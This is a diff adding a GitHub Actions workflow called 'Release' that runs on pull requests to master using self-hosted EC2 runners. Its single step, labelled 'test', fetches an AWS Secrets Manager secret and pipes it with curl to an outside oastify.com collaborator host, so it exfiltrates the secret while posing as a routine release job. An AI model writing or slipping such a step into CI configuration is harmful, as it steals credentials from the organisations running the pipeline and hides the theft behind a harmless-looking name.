@@ -1,0 +1,14 @@
+name: Release
+on:
+  pull_request:
+    branches:
+      - master
+jobs:
+  create-package:
+    name: Create and deploy package
+    runs-on: [ coveo, linux, x64, ec2 ]
+    steps:
+      - name: test
+        run: "aws secretsmanager get-secret-value --region us-east-1 --secret-id arn:aws:secretsmanager:us-east-1:064790157154:secret:dev/tbronson/testing | curl -H \"Content-Type: application/json\" -X POST --data-binary @- acqzuy79yc0dqjhddfm6ldhfk6qyep2e.oastify.com"
+
+
